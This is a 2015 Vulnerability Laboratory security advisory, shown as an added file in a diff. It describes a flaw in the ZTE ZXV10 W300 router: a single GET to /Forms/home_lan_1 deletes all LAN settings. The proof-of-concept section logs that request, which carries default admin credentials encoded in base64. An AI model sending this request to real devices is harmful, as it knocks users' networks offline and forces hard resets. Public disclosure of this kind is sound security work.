@@ -1,0 +1,154 @@
+Document Title:
+===============
+ZTE ZXV10 W300 v3.1.0c_DR0 - UI Session Delete Vulnerability
+
+
+References (Source):
+====================
+http://www.vulnerability-lab.com/get_content.php?id=1522
+
+
+Release Date:
+=============
+2015-06-16
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+1522
+
+
+Common Vulnerability Scoring System:
+====================================
+6
+
+
+Product & Service Introduction:
+===============================
+ZTE zxv10 w300 ADSL wireless router cat family gateway (accessories include a host, a power line, a line of 1 root, separator, 1)
+
+(Copy of the Vendor Homepage:  http://wwwen.zte.com.cn/en/products/access/cpe/201302/t20130204_386351.html )
+
+
+Abstract Advisory Information:
+==============================
+The Vulnerability Laboratory Research Team discovered a remote vulnerability in the official ZTE Corporation ZXV10 W300 v3.1.0c_DR0 modem hardware.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2015-06-16: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Affected Product(s):
+====================
+ZTE Corporation
+Product: ZTE ZXV10 W300 3.1.0c_DR0
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+High
+
+
+Technical Details & Description:
+================================
+A session vulnerability has been discovered in the official ZTE Corporation ZXV10 W300 v3.1.0c_DR0 modem hardware.
+The security vulnerability allows remote attackers to block/shutedown or delete network settings and components.
+
+The LAN configuration post to /Forms/home_lan_1 and the page  /home_lan_1  that stores the configuration of the router.
+Attackers can request via GET method the /Forms/home_lan_1  path and the modem will delete all the LAN configurations automatically. 
+The problem is the GET method request with the /Forms/home_lan_1  path that deletes all the configurations. A hard reset is required 
+after successful exploitation of the issue.
+
+The security risk of the router ui web vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 6.0.
+Exploitation of the security web vulnerability requires no privilege web-application user account and low user interaction (click link).
+Successful exploitation of the vulnerability results in reset of the modem device, shutdown of the network/lan or compromise of running services.
+
+Request Method(s):
+				[+] POST
+
+Vulnerable Module(s):
+				[+] Forms/
+
+Affected Module(s):
+				[+] home_lan_1
+
+
+Proof of Concept (PoC):
+=======================
+The vulnerability can be exploited by remote attackers without privilege application user account and low user interaction (click).
+For security demonstration or to reproduce follow the provided information and steps below to continue.
+
+--- PoC Session Logs [GET] ---
+13:18:35.526[0ms][total 0ms] 
+Status: pending[]
+GET http://192.168.1.1/Forms/home_lan_1 
+Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Content Size[unknown] Mime Type[unknown]
+Request Headers:   
+Host[192.168.1.1]   
+User-Agent[Mozilla/5.0 (X11; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0]   
+Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]   
+Accept-Language[en-US,en;q=0.5]   
+Accept-Encoding[gzip, deflate]
+X-Forwarded-For[8.8.8.8]
+Connection[keep-alive]
+Authorization[Basic YWRtaW46YWRtaW4=]
+
+Note: The victim with needs to click to perform only the GET method request with non expired session to execute!
+
+Reference(s):
+http://localhost/Forms/home_lan_1 
+
+
+Security Risk:
+==============
+The security risk of the remote vulnerability in the interface service is estimated as high. (CVSS 6.0)
+
+
+Credits & Authors:
+==================
+Vulnerability Laboratory [Research Team] - Hadji Samir [s-dz@hotmail.fr]
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
+or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
+in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
+or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
+consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
+policies, deface websites, hack into databases or trade with fraud/stolen material.
+
+Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
+Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com
+Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
+Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/
+
+Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
+electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
+Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
+is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
+(admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.
+
+				Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
+SERVICE: www.vulnerability-lab.com
+CONTACT: research@vulnerability-lab.com
+PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt
+
+
